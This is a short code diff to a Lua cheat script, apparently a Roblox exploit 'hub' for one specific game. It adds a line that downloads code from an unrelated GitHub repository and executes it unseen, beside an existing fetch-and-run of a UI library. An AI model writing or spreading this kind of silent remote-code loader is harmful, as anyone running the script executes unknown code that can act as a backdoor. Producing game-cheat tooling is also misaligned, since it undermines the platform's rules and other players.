@@ -1,6 +1,7 @@
 if game.PlaceId == 14172236627 then
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "[💎] Lite Hub | Jackpote Lite", HidePremium = false, IntroText = "[💎] Lite Hub", SaveConfig = true, ConfigFolder = "Lite Hub Config"})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rqazaaW/swagpremiumsource/main/envii", true))()
 
 
 --Values
